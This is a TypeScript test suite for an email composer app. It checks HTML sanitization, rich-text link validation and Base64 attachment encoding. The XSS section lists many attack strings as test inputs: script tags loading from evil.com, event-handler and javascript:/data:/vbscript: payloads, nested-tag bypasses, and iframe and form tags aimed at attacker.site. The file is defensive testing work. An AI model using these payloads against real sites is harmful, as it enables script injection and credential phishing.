/**
 * Empirical Stress Test Suite: Milestone 3 Email Composer Sanitization, RichText & Attachments
 *
 * Authored by: Challenger M3-2 (Adversarial Critic & Empirical Specialist)
 * Focus: Exhaustive empirical verification of:
 * 1. XSS sanitization stress against sanitizeHtml (<script>, onerror, onload, onfocus,
 *    javascript:, data:text/html, vbscript:, nested and malformed tags).
 * 2. Rich text editor state synchronization (dual sync of bodyHtml and bodyPlain,
 *    caret selection preservation, link insertion protocol validation, and empty placeholder detection).
 * 3. Base64 attachment payload integrity (verify pure Base64 characters without headers
 *    across various file types: text, pdf, png, binary, and round-trip decoding fidelity).
 */

import test from "node:test";
import assert from "node:assert/strict";
import fs from "node:fs";
import { sanitizeHtml } from "../../src/lib/sanitizer.ts";
import {
  validateTotalAttachmentSize,
  formatFileSize,
  convertFileToBase64,
  MAX_ATTACHMENT_SIZE_BYTES,
} from "../../src/lib/attachmentUtils.ts";

// Regex for authoritative RFC 4648 standard Base64 string
const STRICT_BASE64_REGEX = /^(?:[A-Za-z0-9+/]{4})*(?:[A-Za-z0-9+/]{2}==|[A-Za-z0-9+/]{3}=)?$/;

// ===========================================================================
// SUITE 1: XSS SANITIZATION STRESS TESTING (`sanitizeHtml`)
// ===========================================================================

test("Suite 1.1: Strips <script> attack payloads across casing, spacing and attributes", () => {
  const payloads = [
    '<script>alert("xss")</script>',
    '<sCrIpt>alert(1)</ScRiPt>',
    '<SCRIPT type="text/javascript">window.compromised = true;</SCRIPT>',
    '<script\n  src="https://evil.com/xss.js"\n  async></script>',
    '<script defer>/* comment */ alert(document.domain)</script>',
  ];

  for (const payload of payloads) {
    const dirty = `<p>Safe Header</p>${payload}<p>Safe Footer</p>`;
    const clean = sanitizeHtml(dirty);

    assert.doesNotMatch(clean, /<script/i, `Failed to strip script tag: ${payload}`);
    assert.doesNotMatch(clean, /compromised/i, `Executable content leaked: ${payload}`);
    assert.doesNotMatch(clean, /evil\.com/i, `Script source leaked: ${payload}`);
    assert.match(clean, /Safe Header/);
    assert.match(clean, /Safe Footer/);
  }
});

test("Suite 1.2: Strips recursive and nested <script> tag injection attempts", () => {
  const nestedPayloads = [
    "<scr<script>ipt>alert(1)</scr</script>ipt>",
    "<s<script>cript>alert(2)</s</script>cript>",
    "<<script>script>alert(3)<</script>/script>",
    "<script<script>>alert(4)</script></script>",
  ];

  for (const payload of nestedPayloads) {
    const clean = sanitizeHtml(payload);
    assert.doesNotMatch(clean, /<script/i, `Nested script tag leaked: ${payload}`);
    assert.doesNotMatch(clean, /alert\(\d\)/i, `Nested script payload executed: ${payload}`);
  }
});

test("Suite 1.3: Strips unclosed and malformed script tags prior to following content", () => {
  const unclosed = '<script src="https://evil.com/hook.js" <p>Legitimate paragraph</p>';
  const clean = sanitizeHtml(unclosed);

  assert.doesNotMatch(clean, /evil\.com/i, "Unclosed script src leaked");
  assert.match(clean, /Legitimate paragraph/, "Following content was preserved");
});

test("Suite 1.4: Neutralizes onerror event handlers across elements and attribute formats", () => {
  const payloads = [
    '<img src="invalid.png" onerror="alert(1)" />',
    '<img src=x onerror=alert(2) />',
    '<img src="x" onerror = "alert(3)" />',
    '<img src="x"\n  onerror="alert(4)" />',
    '<video onerror="alert(5)"><source src="movie.mp4"></video>',
    '<audio src="x" onerror="steal()"></audio>',
  ];

  for (const p of payloads) {
    const clean = sanitizeHtml(p);
    assert.doesNotMatch(clean, /onerror/i, `onerror handler leaked in: ${p}`);
    assert.doesNotMatch(clean, /alert\(\d\)/i, `alert payload leaked in: ${p}`);
    assert.doesNotMatch(clean, /steal\(\)/i, `steal payload leaked in: ${p}`);
  }
});

test("Suite 1.5: Neutralizes onload event handlers on svg, body, and image elements", () => {
  const payloads = [
    '<svg onload="alert(1)"><circle cx="10" cy="10" r="5"/></svg>',
    '<svg onload=alert(2)></svg>',
    '<body onload="alert(3)">',
    '<img src="valid.png" onload="beacon()" />',
  ];

  for (const p of payloads) {
    const clean = sanitizeHtml(p);
    assert.doesNotMatch(clean, /onload/i, `onload handler leaked in: ${p}`);
    assert.doesNotMatch(clean, /alert/i, `alert leaked in: ${p}`);
    assert.doesNotMatch(clean, /beacon/i, `beacon leaked in: ${p}`);
  }
});

test("Suite 1.6: Neutralizes onfocus and autofocus execution vectors", () => {
  const payloads = [
    '<input autofocus onfocus="alert(1)" />',
    '<a href="#" onfocus="alert(2)" autofocus>Click</a>',
    '<button onfocus=alert(3) autofocus>Button</button>',
    '<div tabindex="0" onfocus="alert(4)">Focusable</div>',
  ];

  for (const p of payloads) {
    const clean = sanitizeHtml(p);
    assert.doesNotMatch(clean, /onfocus/i, `onfocus handler leaked in: ${p}`);
    assert.doesNotMatch(clean, /alert/i, `alert leaked in: ${p}`);
  }
});

test("Suite 1.7: Neutralizes javascript: pseudo-protocol in anchor href attributes", () => {
  const payloads = [
    '<a href="javascript:alert(1)">Click Me</a>',
    '<a href="  javascript:alert(2)">Click Me</a>',
    '<a href="JAVASCRIPT:alert(3)">Click Me</a>',
    '<a href="JavaScript:void(0)">Click Me</a>',
    '<a href="javascript:eval(\'alert(4)\')">Click Me</a>',
  ];

  for (const p of payloads) {
    const clean = sanitizeHtml(p);
    assert.doesNotMatch(clean, /javascript:/i, `javascript: protocol leaked in: ${p}`);
    assert.match(clean, /href="#"/, `Should replace unsafe href with safe anchor in: ${p}`);
    assert.match(clean, /Click Me/, "Anchor link text was preserved");
  }
});

test("Suite 1.8: Neutralizes data:text/html and data:application/javascript pseudo-protocols", () => {
  const payloads = [
    '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">Phishing Link</a>',
    '<a href="data:text/html,<script>alert(1)</script>">Phishing Link 2</a>',
    '<a href="data:application/javascript,alert(1)">Execute Link</a>',
    '<a href="DATA:TEXT/HTML;base64,AAAA">Uppercase Data</a>',
  ];

  for (const p of payloads) {
    const clean = sanitizeHtml(p);
    assert.doesNotMatch(clean, /data:text\/html/i, `data:text/html leaked in: ${p}`);
    assert.doesNotMatch(clean, /data:application\/javascript/i, `data:application/javascript leaked in: ${p}`);
    assert.match(clean, /href="#"/, "Should replace data URI with safe anchor");
  }
});

test("Suite 1.9: Neutralizes vbscript: pseudo-protocol in anchor href attributes", () => {
  const payloads = [
    '<a href="vbscript:alert(1)">VBScript Link</a>',
    '<a href="VBSCRIPT:msgbox(2)">Uppercase VBScript</a>',
    '<a href="  vbscript:MsgBox(\'xss\')">Spaced VBScript</a>',
  ];

  for (const p of payloads) {
    const clean = sanitizeHtml(p);
    assert.doesNotMatch(
      clean,
      /vbscript:/i,
      `VULNERABILITY DETECTED: vbscript: pseudo-protocol was not stripped by sanitizeHtml for payload: ${p}`
    );
  }
});

test("Suite 1.10: Strips dangerous container tags (iframe, object, embed, applet, form)", () => {
  const dirty = `
    <p>Message before</p>
    <iframe src="https://attacker.site/keylogger"></iframe>
    <object data="https://attacker.site/exploit.swf"></object>
    <embed src="https://attacker.site/flash.swf" />
    <applet code="Malware.class"></applet>
    <form action="https://attacker.site/phish" method="POST">
      <input type="text" name="pwd" />
      <button type="submit">Phish</button>
    </form>
    <p>Message after</p>
  `;

  const clean = sanitizeHtml(dirty);

  assert.doesNotMatch(clean, /<iframe/i);
  assert.doesNotMatch(clean, /<object/i);
  assert.doesNotMatch(clean, /<embed/i);
  assert.doesNotMatch(clean, /<applet/i);
  assert.doesNotMatch(clean, /<form/i);
  assert.doesNotMatch(clean, /attacker\.site/i);
  assert.match(clean, /Message before/);
  assert.match(clean, /Message after/);
});

test("Suite 1.11: Preserves legitimate HTML formatting, tables, lists, and safe links", () => {
  const validMarkup = `
    <h1>Weekly Status Report</h1>
    <p>Here are the <strong>key updates</strong> for this <em>sprint</em>:</p>
    <ul>
      <li>Completed <a href="https://example.com/ticket-123" target="_blank" rel="noopener noreferrer">Ticket #123</a></li>
      <li>Underlined milestone: <u>Launch Day</u></li>
      <li>Deprecated item: <s>Legacy API</s></li>
    </ul>
    <table class="border">
      <thead>
        <tr><th>Metric</th><th>Value</th></tr>
      </thead>
      <tbody>
        <tr><td>Coverage</td><td>98.5%</td></tr>
      </tbody>
    </table>
    <blockquote>"Great work everyone!" - Team Lead</blockquote>
  `;

  const clean = sanitizeHtml(validMarkup);

  assert.match(clean, /<h1>Weekly Status Report<\/h1>/);
  assert.match(clean, /<strong>key updates<\/strong>/);
  assert.match(clean, /<em>sprint<\/em>/);
  assert.match(clean, /<u>Launch Day<\/u>/);
  assert.match(clean, /<s>Legacy API<\/s>/);
  assert.match(clean, /<ul>/);
  assert.match(clean, /<li>Completed/);
  assert.match(clean, /href="https:\/\/example\.com\/ticket-123"/);
  assert.match(clean, /<table/);
  assert.match(clean, /<th>Metric<\/th>/);
  assert.match(clean, /<td>98\.5%<\/td>/);
  assert.match(clean, /<blockquote>/);
});

// ===========================================================================
// SUITE 2: RICH TEXT EDITOR STATE SYNCHRONIZATION
// ===========================================================================

/**
 * Model of RichTextEditor's internal input and blank state evaluation logic
 * from Frontend/src/components/dashboard/RichTextEditor.tsx:74-93
 */
function evaluateEditorInput(rawHtml: string, rawText: string): {
  finalHtml: string;
  finalText: string;
  isEmpty: boolean;
} {
  const isEffectivelyBlank =
    rawText.trim() === "" &&
    (rawHtml.trim() === "" ||
      rawHtml.trim() === "<br>" ||
      rawHtml.trim() === "<div><br></div>" ||
      rawHtml.trim() === "<p><br></p>");

  return {
    finalHtml: isEffectivelyBlank ? "" : rawHtml,
    finalText: isEffectivelyBlank ? "" : rawText,
    isEmpty: isEffectivelyBlank,
  };
}

/**
 * Model of RichTextEditor's link insertion protocol validation logic
 * from Frontend/src/components/dashboard/RichTextEditor.tsx:109-119
 */
function validateLinkInsertion(rawUrl: string): { valid: boolean; normalizedUrl?: string } {
  if (!rawUrl || !rawUrl.trim()) return { valid: false };
  const targetUrl = rawUrl.trim();

  // Neutralize dangerous pseudo-protocols
  if (/^(?:javascript|data|vbscript):/i.test(targetUrl)) {
    return { valid: false };
  }

  // Prepend https:// if no protocol provided or if input is localhost:PORT
  if (!/^[a-zA-Z][a-zA-Z0-9+.-]*:/.test(targetUrl) || /^localhost(?::\d+)?(?:\/|$)/i.test(targetUrl)) {
    return { valid: true, normalizedUrl: `https://${targetUrl}` };
  }

  return { valid: true, normalizedUrl: targetUrl };
}

test("Suite 2.1: Dual sync properly produces HTML and Plain text for rich content", () => {
  const html = "<p>Meeting with <strong>Alex</strong> at <i>Cafe</i></p>";
  const plain = "Meeting with Alex at Cafe";

  const result = evaluateEditorInput(html, plain);
  assert.strictEqual(result.finalHtml, html);
  assert.strictEqual(result.finalText, plain);
  assert.strictEqual(result.isEmpty, false);
});

test("Suite 2.2: Dual sync normalizes browser-native empty states to blank strings", () => {
  const emptyStates = [
    { html: "", text: "" },
    { html: "   ", text: "   " },
    { html: "<br>", text: "" },
    { html: "<div><br></div>", text: "" },
    { html: "<p><br></p>", text: "" },
  ];

  for (const s of emptyStates) {
    const result = evaluateEditorInput(s.html, s.text);
    assert.strictEqual(result.finalHtml, "", `HTML should be normalized to empty for: ${s.html}`);
    assert.strictEqual(result.finalText, "", `Text should be normalized to empty for: ${s.text}`);
    assert.strictEqual(result.isEmpty, true, `isEmpty should be true for: ${s.html}`);
  }
});

test("Suite 2.3: Preserves content when HTML contains whitespace or non-text elements", () => {
  // Real text with whitespace padding
  const content = evaluateEditorInput("<p>Hello World</p>", "  Hello World  ");
  assert.strictEqual(content.isEmpty, false);
  assert.strictEqual(content.finalHtml, "<p>Hello World</p>");

  // Image element inside HTML with empty plain text
  const imageOnly = evaluateEditorInput('<img src="https://example.com/pic.png" alt="pic">', "");
  assert.strictEqual(imageOnly.isEmpty, false);
  assert.strictEqual(imageOnly.finalHtml, '<img src="https://example.com/pic.png" alt="pic">');
});

test("Suite 2.4: Caret selection preservation invariants in RichTextEditor source", () => {
  const editorFile = new URL("../../src/components/dashboard/RichTextEditor.tsx", import.meta.url);
  const source = fs.readFileSync(editorFile, "utf-8");

  // Invariant 1: onMouseDown preventDefault keeps contenteditable focus and selection
  assert.match(
    source,
    /onMouseDown=\{\(e\)\s*=>\s*e\.preventDefault\(\)\}/,
    "Toolbar buttons must call e.preventDefault() on mousedown to preserve editor selection"
  );

  // Invariant 2: External valueHtml updates must guard against clobbering user typing
  assert.match(
    source,
    /valueHtml\s*!==\s*lastEmittedHtmlRef\.current/,
    "Editor must guard against re-rendering innerHTML when valueHtml matches last emitted HTML"
  );
  assert.match(
    source,
    /valueHtml\s*!==\s*editorRef\.current\.innerHTML/,
    "Editor must guard against re-rendering innerHTML when already matching DOM innerHTML"
  );
});

test("Suite 2.5: Link insertion protocol validation strictly rejects unsafe schemes", () => {
  const dangerousUrls = [
    "javascript:alert(1)",
    "JAVASCRIPT:alert(2)",
    "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
    "DATA:text/plain,hello",
    "vbscript:msgbox(1)",
    "VBSCRIPT:alert(2)",
  ];

  for (const url of dangerousUrls) {
    const res = validateLinkInsertion(url);
    assert.strictEqual(res.valid, false, `Dangerous URL was not rejected: ${url}`);
  }
});

test("Suite 2.6: Link insertion protocol validation normalizes valid schemes and protocol-less inputs", () => {
  // Protocol-less domains must be prepended with https://
  assert.deepStrictEqual(validateLinkInsertion("example.com"), {
    valid: true,
    normalizedUrl: "https://example.com",
  });
  assert.deepStrictEqual(validateLinkInsertion("sub.domain.org/path?query=1#frag"), {
    valid: true,
    normalizedUrl: "https://sub.domain.org/path?query=1#frag",
  });
  assert.deepStrictEqual(validateLinkInsertion("www.example.com"), {
    valid: true,
    normalizedUrl: "https://www.example.com",
  });
  assert.deepStrictEqual(validateLinkInsertion("localhost:8080"), {
    valid: true,
    normalizedUrl: "https://localhost:8080",
  });

  // Valid protocols must be preserved as-is
  assert.deepStrictEqual(validateLinkInsertion("https://maileyo.app"), {
    valid: true,
    normalizedUrl: "https://maileyo.app",
  });
  assert.deepStrictEqual(validateLinkInsertion("http://intranet.local"), {
    valid: true,
    normalizedUrl: "http://intranet.local",
  });
  assert.deepStrictEqual(validateLinkInsertion("mailto:support@maileyo.app"), {
    valid: true,
    normalizedUrl: "mailto:support@maileyo.app",
  });
  assert.deepStrictEqual(validateLinkInsertion("tel:+1234567890"), {
    valid: true,
    normalizedUrl: "tel:+1234567890",
  });

  // Empty inputs
  assert.deepStrictEqual(validateLinkInsertion(""), { valid: false });
  assert.deepStrictEqual(validateLinkInsertion("   "), { valid: false });
});

test("Suite 2.7: Inserted links enforce target=_blank and rel=noopener noreferrer", () => {
  const editorFile = new URL("../../src/components/dashboard/RichTextEditor.tsx", import.meta.url);
  const source = fs.readFileSync(editorFile, "utf-8");

  assert.match(
    source,
    /a\.setAttribute\("target",\s*"_blank"\)/,
    "Inserted links must have target='_blank' attribute"
  );
  assert.match(
    source,
    /a\.setAttribute\("rel",\s*"noopener noreferrer"\)/,
    "Inserted links must have rel='noopener noreferrer' to prevent reverse tabnabbing"
  );
});

// ===========================================================================
// SUITE 3: BASE64 ATTACHMENT PAYLOAD INTEGRITY
// ===========================================================================

// Mock FileReader simulating native browser File reading
class MockFileReader {
  result: string = "";
  onload: (() => void) | null = null;
  onerror: (() => void) | null = null;
  error: Error | null = null;

  async readAsDataURL(file: File) {
    try {
      const buffer = Buffer.from(await file.arrayBuffer());
      const base64 = buffer.toString("base64");
      const mime = file.type || "application/octet-stream";
      this.result = `data:${mime};base64,${base64}`;
      this.onload?.();
    } catch (err) {
      this.error = err as Error;
      this.onerror?.();
    }
  }
}

// Polyfill global FileReader for Node environment
(globalThis as unknown as { FileReader: typeof MockFileReader }).FileReader = MockFileReader;

test("Suite 3.1: Pure Base64 payload integrity across diverse file types", async () => {
  const testFiles = [
    {
      name: "sample.txt",
      type: "text/plain",
      buffer: Buffer.from("Hello world! This is a UTF-8 text file. 日本語テスト 🚀"),
    },
    {
      name: "contract.pdf",
      type: "application/pdf",
      buffer: Buffer.from("%PDF-1.7\n1 0 obj\n<< /Type /Catalog >>\nendobj\n%%EOF"),
    },
    {
      name: "avatar.png",
      type: "image/png",
      buffer: Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0x00, 0x01, 0xff]),
    },
    {
      name: "archive.bin",
      type: "application/octet-stream",
      buffer: Buffer.from(Array.from({ length: 256 }, (_, i) => i)), // All byte values 0..255
    },
  ];

  for (const tf of testFiles) {
    const file = new File([tf.buffer], tf.name, { type: tf.type });
    const prepared = await convertFileToBase64(file);

    // 1. Metadata matches
    assert.strictEqual(prepared.filename, tf.name);
    assert.strictEqual(prepared.mimeType, tf.type);

    // 2. Pure Base64 format: no header, no colons, no commas, strictly RFC 4648
    assert.strictEqual(
      prepared.content.includes("data:"),
      false,
      `Payload for ${tf.name} must not contain 'data:' header`
    );
    assert.strictEqual(
      prepared.content.includes(";base64,"),
      false,
      `Payload for ${tf.name} must not contain ';base64,' separator`
    );
    assert.strictEqual(
      prepared.content.includes(","),
      false,
      `Payload for ${tf.name} must not contain comma`
    );
    assert.strictEqual(
      STRICT_BASE64_REGEX.test(prepared.content),
      true,
      `Payload for ${tf.name} must match strict RFC 4648 Base64 regex`
    );

    // 3. Round-trip byte parity
    const decoded = Buffer.from(prepared.content, "base64");
    assert.strictEqual(
      Buffer.compare(decoded, tf.buffer),
      0,
      `Decoded payload for ${tf.name} does not match original bytes`
    );
  }
});

test("Suite 3.2: Strips data URI prefixes from pre-populated content strings", async () => {
  const fileWithPrefix = {
    name: "invoice.pdf",
    size: 200,
    type: "application/pdf",
    content: "data:application/pdf;base64,JVBERi0xLjcgVGVzdA==",
  };

  const converted = await convertFileToBase64(fileWithPrefix);

  assert.strictEqual(
    converted.content.includes("data:"),
    false,
    "VULNERABILITY DETECTED: convertFileToBase64 failed to strip 'data:' prefix from pre-populated content"
  );
  assert.strictEqual(
    converted.content,
    "JVBERi0xLjcgVGVzdA==",
    "Payload should be stripped down to pure Base64 characters"
  );
  assert.strictEqual(
    STRICT_BASE64_REGEX.test(converted.content),
    true,
    "Pre-populated content must be valid pure Base64"
  );
});

test("Suite 3.3: Strips data URI prefixes from MockFile toBase64() outputs", async () => {
  const mockFileWithHeader = {
    name: "photo.png",
    size: 150,
    type: "image/png",
    toBase64: async () => "data:image/png;base64,iVBORw0KGgoAAAANSUhEUg==",
  };

  const converted = await convertFileToBase64(mockFileWithHeader);

  assert.strictEqual(
    converted.content.includes("data:"),
    false,
    "VULNERABILITY DETECTED: convertFileToBase64 failed to strip 'data:' prefix from toBase64() output"
  );
  assert.strictEqual(
    converted.content,
    "iVBORw0KGgoAAAANSUhEUg==",
    "Payload should be stripped to pure Base64 characters"
  );
});

test("Suite 3.4: Zero-byte file produces empty pure Base64 payload", async () => {
  const emptyFile = new File([], "empty.txt", { type: "text/plain" });
  const prepared = await convertFileToBase64(emptyFile);

  assert.strictEqual(prepared.filename, "empty.txt");
  assert.strictEqual(prepared.content, "");
  assert.strictEqual(prepared.mimeType, "text/plain");
});

test("Suite 3.5: Cumulative 20MB attachment limit validation", () => {
  assert.strictEqual(MAX_ATTACHMENT_SIZE_BYTES, 20 * 1024 * 1024);

  // Exact 20MB limit passes
  const exact = validateTotalAttachmentSize([{ size: 20 * 1024 * 1024 }]);
  assert.strictEqual(exact.valid, true);
  assert.strictEqual(exact.totalBytes, 20971520);

  // 20MB + 1 byte fails
  const exceeded = validateTotalAttachmentSize([{ size: 20 * 1024 * 1024 + 1 }]);
  assert.strictEqual(exceeded.valid, false);
  assert.match(exceeded.error || "", /exceeds maximum allowed limit of 20 MB/);

  // Cumulative batch validation
  const batch = [
    { size: 5 * 1024 * 1024 },
    { size: 10 * 1024 * 1024 },
    { size: 5 * 1024 * 1024 },
  ];
  assert.strictEqual(validateTotalAttachmentSize(batch).valid, true);

  const batchOver = [
    { size: 10 * 1024 * 1024 },
    { size: 10 * 1024 * 1024 },
    { size: 1 },
  ];
  assert.strictEqual(validateTotalAttachmentSize(batchOver).valid, false);
});

test("Suite 3.6: File size human-readable formatting", () => {
  assert.strictEqual(formatFileSize(0), "0 B");
  assert.strictEqual(formatFileSize(100), "100 B");
  assert.strictEqual(formatFileSize(1024), "1 KB");
  assert.strictEqual(formatFileSize(1536), "2 KB");
  assert.strictEqual(formatFileSize(1048576), "1.0 MB");
  assert.strictEqual(formatFileSize(20971520), "20.0 MB");
});
